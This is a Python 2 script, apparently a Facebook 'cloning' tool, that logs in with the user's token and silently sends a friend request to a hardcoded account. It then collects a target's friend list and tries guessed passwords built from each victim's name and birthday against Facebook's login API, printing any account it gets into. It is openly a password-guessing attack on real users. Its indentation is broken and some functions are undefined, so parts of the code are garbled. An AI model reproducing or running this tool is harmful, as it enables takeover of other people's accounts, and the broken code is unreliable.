#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To lovehacker
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
try:
    import mechanize
except ImportError:
    os.system("pip2 install mechanize")
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
info = time.strftime("%S:%M:%H")
def quit():
    print '\x1b[1;91m[!] Program Closed'
    os.sys.exit()
def loading(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
###########################################################################
#                              Color                                      #
###########################################################################
R = '\033[1;91m'
V = '\033[1;95m'
W = '\033[1;97m'
G = '\033[1;92m'
N = '\033[1;0m'
Y = '\033[1;93m'
'\033[1;91m'
'\033[1;92m'
'\033[1;93m'
'\033[1;94m'
'\033[1;95m'
'\033[1;96m'
'\033[1;97m'
good = "\033[1;32m[\033[1;36m+\033[1;32m]\033[0m"
bad = "\033[1;32m[\033[1;31m!\033[1;32m]\033[0m"
#word
success = "\033[1;32mSuccessful\033[0m"
failed = "\033[1;31mFailed\033[0m"
banner1="""
\033[1;96m▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈╱▔▔▔▔╲┈┈┈┈▇▇
\033[1;96m▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇\033[1;91m  ▇▇┈┈┈▕▕╲┊┊╱▏▏┈┈┈▇▇
\033[1;96m▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇\033[1;91m  ▇▇┈┈┈▕▕▂╱╲▂▏▏┈┈┈▇▇
\033[1;96m▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈╲┊┊┊┊╱┈┈┈┈▇▇
\033[1;96m▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈▕╲▂▂╱▏┈┈┈┈▇▇
\033[1;96m▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇\033[1;91m  ▇▇╱▔▔▔▔┊┊┊┊▔▔▔▔╲▇▇
\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
\033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇\033[1;91m  ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
\033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m  ▇▇  03094161457 ▇▇"""
def load():
    loading(G + '\r[*] Please Wait... \n')
back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
listgrup = []
ids = ('ids.txt')
def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print banner1
        print G+'    Login Your Facebook Account'+N
        id = raw_input( V + '    Email ' + R + ' > ' + W)
        pwd = raw_input( V + '    Paswd ' + R + ' > ' + W)
        os.system('clear')
        load()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m[!] Please Check your Connection!\n\n'+N
            exit()
        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print '\n[#] Login Successfully!!'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
                time.sleep(1)
                menu()
            except requests.exceptions.ConnectionError:
                print R + '\n[!] Please Check your Connection'
                quit()
        if 'checkpoint' in url:
            print '\n\x1b[1;91m[!] \x1b[1;93mYour Account Has Been Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            quit()
        else:
            print '\n\x1b[1;91m[!] Login Failed!'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
def menu():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print R + '[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print banner1
            print '\x1b[1;91m[!]Please Check your Connection!'
            quit()

    os.system('clear')
    print banner1
    print V+' Welcome'+N+' [ '+ G + nama + N+ ' ] '
    print R+15 * '-'+G+'[ \033[1;97mMenu'+N+G+' ]'+R+ 15* '-'+N
    print W + ' 1.' + G + ' Start Cracking'
    print W + ' 2.' + G + ' Logout'
    print W + ' 0.' + R + ' Exit'
    print ''
    pilih()
def pilih():
    zedd = raw_input(G + 'lovehacker ' + R + '\xe2\x96\xb6 ' + W)
    if zedd == '':
        print '\x1b[1;91m [!] Empty command'
        pilih()
    elif zedd == '1':
        super() 
    elif zedd == '2':
        os.system('rm -rf login.txt')
        quit()
    elif zedd == '0':
        os.system('clear')
        print G + 'Bye Bye Tool BlackMafia<3'+N
        raw_input(R + '[ ' + W + 'Quit' + R + ' ]' + N)
        quit()
    else:
        print R + ' [+] Wrong Command!'
        pilih()   
###########################################################################
#                          Start Cracking                                 #
###########################################################################
def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print banner1
    print W + ' 1.' + G + ' Cracked from Public Frend list ID'
    print W + ' 0.' + R + ' Exit'
    print ''
    pilih_super()
def pilih_super():
    peak = raw_input(G + ' lovehacker\x1b[1;91m >\x1b[1;97m ')
    if peak == '':
        print '\x1b[1;91m[!] Empty command'
        pilih_super()
    elif peak == '1':
        os.system('clear')
	print banner1
	idt = raw_input("\033[1;96m☆ \033[1;92mEnter ID\033[1;93m: \033[1;97m")
	print "\033[1;92m====================\033[1;91mKali.linux\033[1;92m======================"
	try:
		jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
		op = json.loads(jok.text)
		print"\033[1;93mName\033[1;93m:\033[1;97m "+op["name"]
	except IOError:
		print"\x1b[1;92mID Not Found!"
		raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
		super()
		print"\033[1;93mGetting IDs\033[1;92m..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
    elif peak == '0':
        menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mCan\'t be Empty'
        pilih_super()
    print "\033[1;95mTotal IDs\033[1;91m: \033[1;95m"+str(len(id))
jalan('\033[1;91mPlease Wait\033[1;94m...')
titik = ['.   ','..  ','... ']
for o in titik:
	print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.001)
	print "\n\033[1;91m«--•◈••◈•---\x1b[1;95m•◈•Stop Process Press CTRL+Z•◈•\033[1;91m---•◈••◈•-»"
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mBlackMafia\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
	def main(arg):
		user = arg
		try:
			a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
			b = json.loads(a.text)
			# Password Guess 1
			pass1 = b['first_name'] + '123'
			data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1
            elif 'www.facebook.com' in q['error_msg']:
                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass1
            else:
            	# Password Guess 2
                pass2 = b['first_name'] + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass2
                elif 'www.facebook.com' in q['error_msg']:
                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass2
                else:
                	# Password Guess 3
                    pass3 = b['last_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass3
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass3
                    else:
                    	# Password Guess 4
                        birth = b['birthday']
                        pass4 = birth.replace('/', '')
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass4
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4
                        else:
                            # Password Guess 5
                            pass5 = b['last_name'] + '04'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                            	print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass5
                            elif 'www.facebook.com' in q['error_msg']:
                            	print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5
                            else:
                            	# Password Guess 6
                            	pass6 = b['first_name'] + '04'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                	print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass6
                                elif 'www.facebook.com' in q['error_msg']:
                            	    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6
                                else:
                                	pass
                            		
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    super()



if __name__ == '__main__':
    login()
